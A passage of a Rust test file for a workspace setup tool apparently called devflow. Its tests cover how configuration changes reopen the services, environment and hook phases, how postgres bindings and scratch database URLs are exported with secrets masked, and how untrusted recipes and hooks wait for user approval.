    let url = "postgres://dfl_x:pw@db.internal:6543/df_proj_x"; // kingfisher:ignore
    let out = create(
        &t.project,
        "old",
        SetupOptions {
            database_url: Some(url.into()),
            ..Default::default()
        },
    )
    .unwrap();
    let w = out.workspace.clone();
    let env_before = std::fs::read(w.path.join(".devflow/env")).unwrap();
    downgrade_to_v1(&w);
    // The file version 1 wrote did not know the compose project name.
    let old_vars: Vec<_> = env_file::read(&w.path)
        .unwrap()
        .into_iter()
        .filter(|(name, _)| name != "COMPOSE_PROJECT_NAME")
        .collect();
    env_file::write(&w.path, &old_vars).unwrap();
    assert!(!env_map(&w).contains_key("COMPOSE_PROJECT_NAME"));
    assert_eq!(Receipt::load(&w.git_dir).unwrap().unwrap().version, 1);

    // Reading migrates in memory only: the binding lands under the sole
    // postgres service, the file is untouched, and the workspace is not
    // claimed ready under an environment generation nothing was written under.
    let listed = &setup::list(&t.project).unwrap()[1];
    let seen = listed.receipt.as_ref().unwrap();
    assert_eq!(seen.version, 2);
    assert_eq!(seen.services["db"].url, url);
    assert_eq!(seen.env_generation, None);
    assert_eq!(listed.status, Some(Status::NeedsAttention));
    assert!(seen.phase(Phase::Env).required_skip);
    assert!(seen.phase(Phase::Hooks).required_skip);
    assert_eq!(Receipt::load(&w.git_dir).unwrap().unwrap().version, 1);

    // The next setup migrates the file under the lock and redoes the
    // environment and the hooks after it, and nothing else.
    let mut rec = Recorder::default();
    let again = setup::setup(
        &t.project,
        &w,
        SetupOptions::default(),
        true,
        false,
        &mut rec,
    );
    assert!(again.unwrap().is_some(), "not ready: --if-new still runs");
    let started: Vec<_> = rec
        .phases
        .iter()
        .filter(|(_, s)| *s == PhaseState::Started)
        .map(|(p, _)| *p)
        .collect();
    assert_eq!(started, vec![Phase::Env, Phase::Hooks]);
    let migrated = receipt_of(&w);
    assert_eq!(migrated.version, 2);
    assert_eq!(migrated.status(), Status::Ready);
    assert_eq!(
        migrated.env_generation,
        Some(t.project.config.env_generation())
    );
    assert_eq!(migrated.services["db"].url, url);
    assert_eq!(migrated.instance_id, out.receipt.instance_id);
    assert_eq!(
        std::fs::read(w.path.join(".devflow/env")).unwrap(),
        env_before,
        "the file now has the compose project name again"
    );
    assert!(env_map(&w).contains_key("COMPOSE_PROJECT_NAME"));
    assert_eq!(
        std::fs::read_to_string(w.path.join(".devflow/runs"))
            .unwrap()
            .lines()
            .count(),
        2,
        "hooks run again after the environment is rewritten"
    );
}

const SERVICE: &str = "\n[services.db]\nengine = \"postgres\"\nmode = \"external\"\n";

/// Edit the project's `devflow.toml` and reload the project. The same edit is
/// made (and committed) in the `devflow.toml` of every worktree, as if it had
/// been committed on every branch: a workspace runs the recipes of its own branch,
/// and these tests are about a configuration change reaching them. A test about
/// a branch that differs writes its own file (see `recipes.rs`).
fn edit_config(t: &Repo, edit: impl Fn(String) -> String) -> Project {
    let before = Project::open(&t.root).unwrap();
    for workspace in worktree::list(&before).unwrap() {
        let path = workspace.path.join("devflow.toml");
        if let Ok(text) = std::fs::read_to_string(&path) {
            std::fs::write(&path, edit(text)).unwrap();
            // Committed, so the checkout stays clean and a branch made later
            // from this one carries the change.
            commit_all(&git2::Repository::open(&workspace.path).unwrap(), "config");
        }
    }
    Project::open(&t.root).unwrap()
}

fn attach_to(url: &str) -> SetupOptions {
    SetupOptions {
        database_url: Some(url.into()),
        ..Default::default()
    }
}

fn phase_states(receipt: &Receipt) -> Vec<(Phase, PhaseState, bool)> {
    [Phase::Services, Phase::Env, Phase::Hooks]
        .into_iter()
        .map(|p| {
            let r = receipt.phase(p);
            (p, r.state, r.required_skip)
        })
        .collect()
}

#[test]
fn a_service_added_later_reopens_services_env_and_hooks_until_setup_completes_them() {
    let t = repo(
        &Hooks {
            setup: &["echo run >> .devflow/runs"],
            ..Default::default()
        },
        "",
    );
    trust::approve(&t.project).unwrap();
    let out = create(&t.project, "w", SetupOptions::default()).unwrap();
    let w = out.workspace;
    assert_eq!(out.status, Status::Ready);
    assert_eq!(
        out.receipt.phase(Phase::Services).state,
        PhaseState::Skipped
    );
    assert!(!env_map(&w).contains_key("DATABASE_URL"));
    let runs = || std::fs::read_to_string(w.path.join(".devflow/runs")).unwrap();
    assert_eq!(runs().lines().count(), 1);

    // The project gains a postgres service.
    let project = edit_config(&t, |text| text + SERVICE);
    let listed = &setup::list(&project).unwrap()[1];
    assert_eq!(listed.status, Some(Status::NeedsAttention));
    let reopened = listed.receipt.as_ref().unwrap();
    assert_eq!(
        phase_states(reopened),
        vec![
            (Phase::Services, PhaseState::Skipped, true),
            (Phase::Env, PhaseState::Skipped, true),
            (Phase::Hooks, PhaseState::Skipped, true),
        ]
    );
    let why = reopened.phase(Phase::Services).detail.unwrap();
    assert!(why.contains("service 'db' added"), "{why}");
    // Reading changed nothing on disk.
    assert_eq!(receipt_of(&w).status(), Status::Ready);

    // `--if-new` must not take the "already set up" shortcut.
    let url = "postgres://dfl_x:pw@db.internal:6543/df_proj_x"; // kingfisher:ignore
    let mut rec = Recorder::default();
    let resumed = setup::setup(&project, &w, attach_to(url), true, false, &mut rec)
        .unwrap()
        .expect("a stale workspace is not skipped");
    assert_eq!(resumed.status, Status::Ready);
    let started: Vec<_> = rec
        .phases
        .iter()
        .filter(|(_, s)| *s == PhaseState::Started)
        .map(|(p, _)| *p)
        .collect();
    assert_eq!(started, vec![Phase::Services, Phase::Env, Phase::Hooks]);
    let generation = project.config.service_generation("db");
    let stored = receipt_of(&w);
    assert_eq!(stored.services["db"].applied, generation);
    assert_eq!(stored.env_generation, Some(project.config.env_generation()));
    assert_eq!(env_map(&w)["DATABASE_URL"], url);
    assert_eq!(runs().lines().count(), 2, "hooks run again, at least once");

    // Current again: nothing is left to do.
    assert!(
        setup::setup(
            &project,
            &w,
            SetupOptions::default(),
            true,
            false,
            &mut NoProgress
        )
        .unwrap()
        .is_none()
    );
    assert_eq!(
        setup::list(&project).unwrap()[1].status,
        Some(Status::Ready)
    );
}

#[test]
fn a_changed_service_is_reapplied_by_the_next_switch() {
    let t = repo(&Hooks::default(), SERVICE);
    let url = "postgres://dfl_x:pw@db.internal:6543/df_proj_x"; // kingfisher:ignore
    let out = create(&t.project, "w", attach_to(url)).unwrap();
    let w = out.workspace;
    assert_eq!(out.status, Status::Ready);
    let first = out.receipt.services["db"].applied.clone().unwrap();

    // Unrelated edits do not matter; editing the service does.
    let project = edit_config(&t, |text| text.replace("[hooks]", "[hooks]\n# a comment"));
    assert_eq!(
        setup::list(&project).unwrap()[1].status,
        Some(Status::Ready)
    );
    let project = edit_config(&t, |text| {
        text.replace(
            "mode = \"external\"\n",
            "mode = \"external\"\nrequire_cow = true\n",
        )
    });
    assert_ne!(project.config.service_generation("db").unwrap(), first);
    let listed = &setup::list(&project).unwrap()[1];
    assert_eq!(listed.status, Some(Status::NeedsAttention));
    assert!(
        listed
            .receipt
            .as_ref()
            .unwrap()
            .phase(Phase::Services)
            .detail
            .unwrap()
            .contains("'db' changed")
    );

    // A switch into the workspace completes the reopened phases.
    let switched = setup::activate(&project, &w, SetupOptions::default(), &mut NoProgress).unwrap();
    assert_eq!(switched.status, Status::Ready);
    let stored = receipt_of(&w);
    assert_eq!(
        stored.services["db"].applied,
        project.config.service_generation("db")
    );
    assert_eq!(stored.services["db"].url, url, "the binding itself is kept");
    assert_eq!(env_map(&w)["DATABASE_URL"], url);
}

/// A binding as a server-backed setup records it, with scratch databases.
fn with_scratch(receipt: &mut Receipt, url: &str, extras: &[(&str, &str)]) {
    use devflow_core::receipt::{DataBinding, ExtraBinding};
    let mut bound = ServiceBinding::postgres(
        DataBinding {
            branch_id: Some(uuid::Uuid::new_v4()),
            database: "df_proj_x".into(),
            role: "dfl_x".into(),
            url: url.into(),
            source: "empty".into(),
            owned: true,
        },
        None,
    );
    for (name, database) in extras {
        bound.extras.insert(
            (*name).into(),
            ExtraBinding {
                database: (*database).into(),
            },
        );
    }
    receipt.services.insert("db".into(), bound);
}

#[test]
fn scratch_urls_are_exported_for_the_configured_names_with_the_bindings_login() {
    let url = "postgres://dfl_x:S3cr3t%2Fpw@db.internal:6543/df_proj_x?sslmode=disable"; // kingfisher:ignore
    let t = repo(
        &Hooks::default(),
        &format!("{SERVICE}extra_databases = [\"test\", \"shadow\", \"e2e\"]\n"),
    );
    let w = create(&t.project, "w", attach_to(url)).unwrap();
    let mut receipt = w.receipt.clone();
    // `e2e` is configured but the server has not provisioned it (yet); `old`
    // is provisioned but no longer configured: neither is exported.
    with_scratch(
        &mut receipt,
        url,
        &[
            ("test", "df_proj_x_1"),
            ("shadow", "df_proj_x_2"),
            ("old", "df_proj_x_9"),
        ],
    );
    let vars: std::collections::HashMap<_, _> = setup::env_vars(&t.project, &w.workspace, &receipt)
        .into_iter()
        .collect();
    assert_eq!(vars["DATABASE_URL"], url);
    assert_eq!(
        vars["TEST_DATABASE_URL"],
        "postgres://dfl_x:S3cr3t%2Fpw@db.internal:6543/df_proj_x_1?sslmode=disable", // kingfisher:ignore
        "the binding's login, password, endpoint and options; another database"
    );
    assert_eq!(
        vars["SHADOW_DATABASE_URL"],
        "postgres://dfl_x:S3cr3t%2Fpw@db.internal:6543/df_proj_x_2?sslmode=disable" // kingfisher:ignore
    );
    assert!(!vars.contains_key("E2E_DATABASE_URL"));
    assert!(!vars.contains_key("OLD_DATABASE_URL"));
    // They are credentials like DATABASE_URL: masked wherever output is shown.
    for name in ["DATABASE_URL", "TEST_DATABASE_URL", "SHADOW_DATABASE_URL"] {
        let shown = devflow_core::redact::text(&vars[name]);
        assert!(!shown.contains("S3cr3t"), "{name}: {shown}");
    }
    // A binding that lists none exports none.
    receipt.services.get_mut("db").unwrap().extras.clear();
    let vars = setup::env_vars(&t.project, &w.workspace, &receipt);
    assert!(
        vars.iter()
            .all(|(k, _)| !k.ends_with("_DATABASE_URL") || k == "DATABASE_URL"),
        "{vars:?}"
    );
}

#[test]
fn changing_extra_databases_reopens_services_and_a_url_only_attachment_says_it_has_none() {
    let url = "postgres://dfl_x:pw@db.internal:6543/df_proj_x"; // kingfisher:ignore
    let t = repo(&Hooks::default(), SERVICE);
    let out = create(&t.project, "w", attach_to(url)).unwrap();
    let w = out.workspace;
    assert_eq!(out.status, Status::Ready);

    // Naming a scratch database changes the service: the workspace needs a
    // setup (or the next switch) to provision it.
    let project = edit_config(&t, |text| {
        text.replace(
            "mode = \"external\"\n",
            "mode = \"external\"\nextra_databases = [\"test\"]\n",
        )
    });
    let listed = &setup::list(&project).unwrap()[1];
    assert_eq!(listed.status, Some(Status::NeedsAttention));
    assert!(
        listed
            .receipt
            .as_ref()
            .unwrap()
            .phase(Phase::Services)
            .detail
            .unwrap()
            .contains("'db' changed")
    );
    // A URL the user attached names no branch devflow could add a database
    // to: setup completes, says so, and exports no scratch URL.
    let switched = setup::activate(&project, &w, SetupOptions::default(), &mut NoProgress).unwrap();
    assert_eq!(
        switched.status,
        Status::Ready,
        "{:?}",
        switched.receipt.phases
    );
    assert!(
        switched
            .warnings
            .iter()
            .any(|w| w.contains("extra_databases") && w.contains("attached")),
        "{:?}",
        switched.warnings
    );
    assert!(!env_map(&w).contains_key("TEST_DATABASE_URL"));
    assert_eq!(env_map(&w)["DATABASE_URL"], url);

    // Taking the names away again is a change too, and a quiet one.
    let project = edit_config(&t, |text| {
        text.replace("extra_databases = [\"test\"]\n", "")
    });
    assert_eq!(
        setup::list(&project).unwrap()[1].status,
        Some(Status::NeedsAttention)
    );
    let switched = setup::activate(&project, &w, SetupOptions::default(), &mut NoProgress).unwrap();
    assert_eq!(switched.status, Status::Ready);
    assert!(switched.warnings.is_empty(), "{:?}", switched.warnings);
}

#[test]
fn deliberate_skips_survive_a_configuration_change() {
    let t = repo(
        &Hooks {
            setup: &["echo run >> .devflow/runs"],
            ..Default::default()
        },
        "",
    );
    trust::approve(&t.project).unwrap();
    let no_db = create(
        &t.project,
        "no-db",
        SetupOptions {
            no_db: true,
            ..Default::default()
        },
    )
    .unwrap()
    .workspace;
    let no_hooks = create(
        &t.project,
        "no-hooks",
        SetupOptions {
            no_hooks: true,
            ..Default::default()
        },
    )
    .unwrap()
    .workspace;
    assert!(receipt_of(&no_db).phase(Phase::Services).deliberate);
    assert!(receipt_of(&no_hooks).phase(Phase::Hooks).deliberate);

    let project = edit_config(&t, |text| text + SERVICE);
    let listed = setup::list(&project).unwrap();
    // `--no-db`: no service applies to it, but it owns what the new service
    // exports, so its environment (not its services) reopens.
    let status = |name: &str| {
        listed
            .iter()
            .find(|l| l.workspace.name == name)
            .unwrap()
            .status
    };
    assert_eq!(status("no-db"), Some(Status::NeedsAttention));
    let no_db_receipt = listed
        .iter()
        .find(|l| l.workspace.name == "no-db")
        .unwrap()
        .receipt
        .clone()
        .unwrap();
    assert!(no_db_receipt.phase(Phase::Env).required_skip);
    let services = no_db_receipt.phase(Phase::Services);
    assert!(
        services.deliberate && !services.required_skip,
        "{services:?}"
    );
    // `--no-hooks`: services and env reopen, the hooks skip is kept.
    assert_eq!(status("no-hooks"), Some(Status::NeedsAttention));
    let url = "postgres://dfl_x:pw@db.internal:6543/df_proj_x"; // kingfisher:ignore
    let done = setup::setup(
        &project,
        &no_hooks,
        attach_to(url),
        false,
        false,
        &mut NoProgress,
    )
    .unwrap()
    .unwrap();
    assert_eq!(done.status, Status::Ready);
    assert_eq!(done.receipt.phase(Phase::Hooks).state, PhaseState::Skipped);
    assert!(done.receipt.phase(Phase::Hooks).deliberate);
    assert!(
        !no_hooks.path.join(".devflow/runs").exists(),
        "hooks stayed skipped"
    );
}

#[test]
fn a_removed_service_keeps_its_binding_and_reopens_the_environment() {
    let t = repo(&Hooks::default(), SERVICE);
    let url = "postgres://dfl_x:pw@db.internal:6543/df_proj_x"; // kingfisher:ignore
    let w = create(&t.project, "w", attach_to(url)).unwrap().workspace;
    assert_eq!(env_map(&w)["DATABASE_URL"], url);
    let project = edit_config(&t, |text| text.replace(SERVICE, "\n"));
    assert!(project.config.postgres().is_none());
    let listed = &setup::list(&project).unwrap()[1];
    assert_eq!(listed.status, Some(Status::NeedsAttention));
    let receipt = listed.receipt.as_ref().unwrap();
    assert_eq!(
        receipt.phase(Phase::Services).state,
        PhaseState::Done,
        "nothing to bind for a service that is gone"
    );
    assert!(receipt.phase(Phase::Env).required_skip);
    assert!(
        receipt
            .phase(Phase::Env)
            .detail
            .unwrap()
            .contains("'db' removed"),
    );
    // The binding is still in the receipt: nothing is deleted.
    assert_eq!(receipt_of(&w).services["db"].url, url);
}

const RECIPES: &str = "\n[env]\npresets = [\"laravel\"]\nDIRECT_URL = \"${DATABASE_URL}\"\n\
                       AUTH = \"${PGUSER}:${PGPASSWORD}\"\nPLAIN = \"http://${PGHOST}\"\n";
const SECRET_URL: &str = "postgres://dfl_x:S3cr3t%2Fpw@db.internal:6543/df_proj_x"; // kingfisher:ignore

#[test]
fn every_workspace_exports_a_compose_project_name_built_from_its_identity() {
    let t = plain();
    let a = create(&t.project, "a", SetupOptions::default()).unwrap();
    let b = create(&t.project, "b", SetupOptions::default()).unwrap();
    let name = |out: &SetupOutcome| env_map(&out.workspace)["COMPOSE_PROJECT_NAME"].clone();
    let project8 = &t.project.id().simple().to_string()[..8];
    for out in [&a, &b] {
        let instance8 = &out.receipt.instance_id.simple().to_string()[..8];
        assert_eq!(name(out), format!("df-{project8}-{instance8}"));
    }
    assert_ne!(name(&a), name(&b), "one per workspace");
}

#[test]
fn env_recipes_and_presets_reach_the_env_file_and_hooks_with_secrets_masked() {
    let t = repo(
        &Hooks {
            setup: &[
                "echo \"slug=$COMPOSE_PROJECT_NAME\"",
                "echo \"direct=$DIRECT_URL auth=$AUTH pw=$DB_PASSWORD host=$DB_HOST plain=$PLAIN\"",
            ],
            ..Default::default()
        },
        &format!("{SERVICE}{RECIPES}"),
    );
    trust::approve(&t.project).unwrap();
    let mut rec = Recorder::default();
    let out = setup::create(
        &t.project,
        CreateRequest {
            name: "w".into(),
            from: None,
            base: None,
            options: attach_to(SECRET_URL),
        },
        &mut rec,
    )
    .unwrap();
    assert_eq!(out.status, Status::Ready, "{:?}", out.receipt.phases);
    let env = env_map(&out.workspace);
    assert_eq!(env["DATABASE_URL"], SECRET_URL);
    assert_eq!(env["DIRECT_URL"], SECRET_URL);
    assert_eq!(env["AUTH"], "dfl_x:S3cr3t/pw");
    assert_eq!(env["PLAIN"], "http://db.internal");
    assert_eq!(env["DB_CONNECTION"], "pgsql");
    assert_eq!(env["DB_HOST"], "db.internal");
    assert_eq!(env["DB_PORT"], "6543");
    assert_eq!(env["DB_DATABASE"], "df_proj_x");
    assert_eq!(env["DB_USERNAME"], "dfl_x");
    assert_eq!(env["DB_PASSWORD"], "S3cr3t/pw");
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        let mode = std::fs::metadata(env_file::path(&out.workspace.path))
            .unwrap()
            .permissions()
            .mode();
        assert_eq!(
            mode & 0o777,
            0o600,
            "values derived from secrets live in a 0600 file"
        );
    }

    // Hooks get the recipes; what was derived from the password is masked in
    // everything shown or logged, though `AUTH` is not secret by name or shape.
    // `DIRECT_URL` is a recipe built on the password, so it is masked whole.
    let direct = "direct=*** auth=*** pw=*** host=db.internal plain=http://db.internal".to_string();
    assert!(rec.lines.contains(&direct), "{:?}", rec.lines);
    assert!(
        rec.lines.contains(&format!("slug={}", out.receipt.slug())),
        "{:?}",
        rec.lines
    );
    let log = std::fs::read_to_string(out.hooks.as_ref().unwrap().log.as_ref().unwrap()).unwrap();
    for text in [log.as_str(), &rec.lines.join("\n")] {
        assert!(!text.contains("S3cr3t"), "{text}");
    }
    // And never in what the outcome says.
    let outcome = serde_json::to_string(&out.receipt.phase(Phase::Env)).unwrap();
    assert!(!outcome.contains("S3cr3t"), "{outcome}");
    assert!(out.warnings.is_empty(), "{:?}", out.warnings);
}

#[test]
fn env_recipes_that_need_a_database_are_left_out_of_a_workspace_without_one() {
    let t = repo(&Hooks::default(), &format!("{SERVICE}{RECIPES}"));
    trust::approve(&t.project).unwrap();
    let out = create(
        &t.project,
        "nodb",
        SetupOptions {
            no_db: true,
            ..Default::default()
        },
    )
    .unwrap();
    assert_eq!(out.status, Status::Ready);
    let env = env_map(&out.workspace);
    for gone in ["DIRECT_URL", "AUTH", "PLAIN", "DB_HOST", "DATABASE_URL"] {
        assert!(!env.contains_key(gone), "{gone} in {env:?}");
    }
    assert!(env.contains_key("COMPOSE_PROJECT_NAME"));
    let warnings = out.warnings.join("\n");
    assert!(
        warnings.contains("laravel") && warnings.contains("no postgres binding"),
        "{warnings}"
    );
    for key in ["env.DIRECT_URL", "env.AUTH", "env.PLAIN"] {
        assert!(warnings.contains(key), "{key} in {warnings}");
    }
}

#[test]
fn untrusted_env_recipes_are_not_applied_and_leave_the_workspace_needing_attention() {
    let t = repo(&Hooks::default(), &format!("{SERVICE}{RECIPES}"));
    // Nothing runs, yet the recipes put values into every process that loads
    // the file: they wait for the approval like hooks do.
    let out = create(&t.project, "w", attach_to(SECRET_URL)).unwrap();
    assert_eq!(out.status, Status::NeedsAttention);
    let env = out.receipt.phase(Phase::Env);
    assert!(
        env.state == PhaseState::Skipped && env.required_skip,
        "{env:?}"
    );
    assert!(env.detail.unwrap().contains("approve"));
    let vars = env_map(&out.workspace);
    assert_eq!(
        vars["DATABASE_URL"], SECRET_URL,
        "what devflow generates is there"
    );
    assert!(vars.contains_key("COMPOSE_PROJECT_NAME"));
    for gone in ["DIRECT_URL", "AUTH", "PLAIN", "DB_HOST", "DB_PASSWORD"] {
        assert!(!vars.contains_key(gone), "{gone} in {vars:?}");
    }

    // One approved run applies them without storing anything.
    let w = out.workspace;
    let once = setup::setup(
        &t.project,
        &w,
        SetupOptions {
            approval: Some(trust::Approval::of(&trust::scope(&t.project))),
            ..Default::default()
        },
        false,
        false,
        &mut NoProgress,
    )
    .unwrap()
    .unwrap();
    assert_eq!(once.status, Status::Ready, "{:?}", once.receipt.phases);
    assert_eq!(env_map(&w)["DIRECT_URL"], SECRET_URL);
    assert!(matches!(
        trust::state(&t.project).unwrap(),
        trust::TrustState::Untrusted { .. }
    ));
}

#[test]
fn the_approval_covers_pitchfork_processes_and_a_version_one_approval_covers_nothing() {
    // Rewrites trust.toml by hand: alone in a child process, so the other
    // tests' approvals (one shared file in the parent) cannot race with it.
    const NAME: &str =
        "the_approval_covers_pitchfork_processes_and_a_version_one_approval_covers_nothing";
    if !in_child(NAME, &[]) {
        return;
    }
    let t = repo(
        &Hooks {
            setup: &["echo run >> .devflow/runs"],
            ..Default::default()
        },
        "",
    );
    trust::approve(&t.project).unwrap();
    let a = create(&t.project, "a", SetupOptions::default()).unwrap();
    assert_eq!(a.status, Status::Ready, "{:?}", a.receipt.phases);
    // The digest the hooks ran under is the whole scope's.
    let digest = trust::digest(&t.project);
    assert_eq!(a.receipt.hooks_digest.as_deref(), Some(digest.as_str()));

    // A daemon appears in the project's pitchfork.toml (committed, so the new
    // worktree has it too): the approval no longer covers the scope, so the
    // hooks it governed do not run.
    std::fs::write(
        t.root.join("pitchfork.toml"),
        "[daemons.api]\nrun = \"bun run dev\"\ncron = \"0 * * * *\"\n",
    )
    .unwrap();
    commit_all(
        &git2::Repository::open(&t.root).unwrap(),
        "add a pitchfork daemon",
    );
    let project = Project::open(&t.root).unwrap();
    let state = trust::state(&project).unwrap();
    assert!(
        matches!(
            state,
            trust::TrustState::Untrusted {
                previously_trusted: true,
                format_changed: false,
                ..
            }
        ),
        "{state:?}"
    );
    assert!(project_scope_flags_cron(&project));
    let b = create(&project, "b", SetupOptions::default()).unwrap();
    assert_eq!(b.status, Status::NeedsAttention);
    assert!(!b.workspace.path.join(".devflow/runs").exists());
    assert!(
        b.receipt
            .phase(Phase::Hooks)
            .detail
            .unwrap()
            .contains("not trusted"),
        "{:?}",
        b.receipt.phase(Phase::Hooks)
    );
    // Approving the reviewed scope (daemons included) lets setup finish.
    trust::approve_scope(&project, &trust::scope(&project)).unwrap();
    let b = setup::setup(
        &project,
        &b.workspace,
        SetupOptions::default(),
        false,
        false,
        &mut NoProgress,
    )
    .unwrap()
    .unwrap();
    assert_eq!(b.status, Status::Ready, "{:?}", b.receipt.phases);
    assert!(b.workspace.path.join(".devflow/runs").is_file());

    // An approval written by version 1 (hooks only, no version) is not an approval.
    let config_dir = std::env::var("DEVFLOW_CONFIG_DIR").unwrap();
    let file = Path::new(&config_dir).join("trust.toml");
    let text = std::fs::read_to_string(&file).unwrap();
    let mut v1 = String::new();
    for block in text.split("[[approval]]").skip(1) {
        let mine = block.contains(&project.id().to_string());
        let kept: Vec<_> = block
            .lines()
            .filter(|l| !(mine && l.starts_with("version")))
            .collect();
        v1.push_str("[[approval]]");
        v1.push_str(&kept.join("\n"));
        v1.push('\n');
    }
    std::fs::write(&file, v1).unwrap();
    let state = trust::state(&project).unwrap();
    assert!(
        matches!(
            state,
            trust::TrustState::Untrusted {
                previously_trusted: true,
                format_changed: true,
                ..
            }
        ),
        "{state:?}"
    );
    let c = create(&project, "c", SetupOptions::default()).unwrap();
    assert_eq!(
        c.status,
        Status::NeedsAttention,
        "the old approval authorizes nothing"
    );
    assert!(!c.workspace.path.join(".devflow/runs").exists());
}

fn project_scope_flags_cron(project: &Project) -> bool {
    let scope = trust::scope(project);
    scope.has_autonomous_triggers()
        && scope
            .processes
            .autonomous
            .iter()
            .any(|t| t.daemon == "api" && t.trigger == "cron")
}

#[test]
fn the_scope_and_its_digest_never_contain_what_devflow_generates() {
    let t = repo(&Hooks::default(), &format!("{SERVICE}{RECIPES}"));
    let before = trust::scope(&t.project);
    trust::approve(&t.project).unwrap();
    let out = create(&t.project, "w", attach_to(SECRET_URL)).unwrap();
    assert_eq!(out.status, Status::Ready, "{:?}", out.receipt.phases);
    let after = trust::scope(&t.project);
    assert_eq!(
        before.digest, after.digest,
        "setting up changes nothing in the scope"
    );
    assert_eq!(
        trust::state(&t.project).unwrap(),
        trust::TrustState::Trusted
    );
    let shown = serde_json::to_string(&after).unwrap();
    for generated in ["S3cr3t", "df_proj_x", "db.internal"] {
        assert!(!shown.contains(generated), "{generated} in {shown}");
    }
    assert!(shown.contains("${DATABASE_URL}") && shown.contains("${PGUSER}:${PGPASSWORD}"));
}

#[test]
fn changing_the_env_section_reopens_env_and_hooks_until_setup_applies_it() {
    let t = repo(
        &Hooks {
            setup: &["echo run >> .devflow/runs"],
            ..Default::default()
        },
        &format!("{SERVICE}{RECIPES}"),
    );
    trust::approve(&t.project).unwrap();
    let w = create(&t.project, "w", attach_to(SECRET_URL))
        .unwrap()
        .workspace;
    assert_eq!(env_map(&w)["PLAIN"], "http://db.internal");
    assert_eq!(
        setup::list(&t.project).unwrap()[1].status,
        Some(Status::Ready)
    );

    let project = edit_config(&t, |text| {
        text.replace("http://${PGHOST}", "https://${PGHOST}")
    });
    trust::approve(&project).unwrap();
    let listed = &setup::list(&project).unwrap()[1];
    assert_eq!(listed.status, Some(Status::NeedsAttention));
    let receipt = listed.receipt.as_ref().unwrap();
    assert!(receipt.phase(Phase::Env).required_skip);
    assert!(receipt.phase(Phase::Hooks).required_skip);
    let out = setup::setup(
        &project,
        &w,
        SetupOptions::default(),
        false,
        false,
        &mut NoProgress,
    )
    .unwrap()
    .unwrap();
    assert_eq!(out.status, Status::Ready, "{:?}", out.receipt.phases);
    assert_eq!(env_map(&w)["PLAIN"], "https://db.internal");
    assert_eq!(
        std::fs::read_to_string(w.path.join(".devflow/runs"))
            .unwrap()
            .lines()
            .count(),
        2,
        "hooks run again after a configuration change"
    );
}

#[test]
fn a_no_db_workspace_picks_up_env_changes_and_the_names_a_service_exports_but_skips_its_services() {
    let t = repo(
        &Hooks {
            setup: &["echo run >> .devflow/runs"],
            ..Default::default()
        },
        "[env]\nGREETING = \"hello\"\n",
    );
    trust::approve(&t.project).unwrap();
    let w = create(
        &t.project,
        "w",
        SetupOptions {
            no_db: true,
            ..Default::default()
        },
    )
    .unwrap()
    .workspace;
    assert_eq!(env_map(&w)["GREETING"], "hello");
    let runs = || std::fs::read_to_string(w.path.join(".devflow/runs")).unwrap();
    assert_eq!(runs().lines().count(), 1);
    let status = |project: &Project| setup::list(project).unwrap()[1].status;
    assert_eq!(status(&t.project), Some(Status::Ready));

    // A service the workspace deliberately has no part in is not applied to
    // it, but the workspace owns what it exports: the file must list that.
    let with_service = edit_config(&t, |text| format!("{text}{SERVICE}"));
    assert_eq!(status(&with_service), Some(Status::NeedsAttention));
    let services = setup::list(&with_service).unwrap()[1]
        .receipt
        .as_ref()
        .unwrap()
        .phase(Phase::Services);
    assert!(
        services.deliberate && !services.required_skip,
        "{services:?}"
    );

    // An approved `[env]` change reopens the environment and the hooks, but
    // not the services the workspace skipped on request.
    let project = edit_config(&t, |text| text.replace("hello", "hi"));
    trust::approve(&project).unwrap();
    let listed = &setup::list(&project).unwrap()[1];
    assert_eq!(listed.status, Some(Status::NeedsAttention));
    let receipt = listed.receipt.as_ref().unwrap();
    assert!(receipt.phase(Phase::Env).required_skip);
    assert!(receipt.phase(Phase::Hooks).required_skip);
    let services = receipt.phase(Phase::Services);
    assert!(
        services.deliberate && !services.required_skip,
        "{services:?}"
    );
    let out = setup::setup(
        &project,
        &w,
        SetupOptions::default(),
        false,
        false,
        &mut NoProgress,
    )
    .unwrap()
    .unwrap();
    assert_eq!(out.status, Status::Ready, "{:?}", out.receipt.phases);
    assert_eq!(env_map(&w)["GREETING"], "hi");
    assert_eq!(runs().lines().count(), 2, "hooks run again");
    assert_eq!(status(&project), Some(Status::Ready));
    assert!(
        !receipt_of(&w).services.contains_key("db"),
        "still no database"
    );
}

#[test]
fn a_removed_service_is_applied_once_not_exported_and_not_drift_forever() {
    let t = repo(
        &Hooks {
            setup: &["echo run >> .devflow/runs"],
            ..Default::default()
        },
        SERVICE,
    );
    trust::approve(&t.project).unwrap();
    let url = "postgres://dfl_x:pw@db.internal:6543/df_proj_x"; // kingfisher:ignore
    let w = create(&t.project, "w", attach_to(url)).unwrap().workspace;
    let runs = || std::fs::read_to_string(w.path.join(".devflow/runs")).unwrap();
    assert_eq!(runs().lines().count(), 1);

    // The service is removed: the workspace needs a setup to apply it.
    let project = edit_config(&t, |text| text.replace(SERVICE, "\n"));
    assert_eq!(
        setup::list(&project).unwrap()[1].status,
        Some(Status::NeedsAttention)
    );
    let mut rec = Recorder::default();
    let applied = setup::setup(
        &project,
        &w,
        SetupOptions::default(),
        false,
        false,
        &mut rec,
    )
    .unwrap()
    .unwrap();
    assert_eq!(
        applied.status,
        Status::Ready,
        "{:?}",
        applied.receipt.phases
    );
    assert_eq!(runs().lines().count(), 2, "the hooks ran once more");
    // The attachment was made under `services.db`; with the service gone it
    // is an orphan, never a fallback export.
    let env = env_map(&w);
    assert!(
        !env.contains_key("DATABASE_URL") && !env.contains_key("PGHOST"),
        "{env:?}"
    );
    let kept = receipt_of(&w).services["db"].clone();
    assert_eq!(kept.url, url, "the binding is kept");
    assert!(kept.orphaned);

    // Nothing is left to apply: the workspace stays ready and a second setup
    // starts no phase and reruns no hook.
    assert_eq!(
        setup::list(&project).unwrap()[1].status,
        Some(Status::Ready)
    );
    let mut rec = Recorder::default();
    let again = setup::setup(
        &project,
        &w,
        SetupOptions::default(),
        false,
        false,
        &mut rec,
    )
    .unwrap()
    .unwrap();
    assert_eq!(again.status, Status::Ready);
    assert!(
        rec.phases.iter().all(|(_, s)| *s != PhaseState::Started),
        "{:?}",
        rec.phases
    );
    assert_eq!(runs().lines().count(), 2);

    // The service coming back is applied afresh and exports its binding again.
    let project = edit_config(&t, |text| text + SERVICE);
    assert_eq!(
        setup::list(&project).unwrap()[1].status,
        Some(Status::NeedsAttention)
    );
    let back = setup::setup(
        &project,
        &w,
        SetupOptions::default(),
        false,
        false,
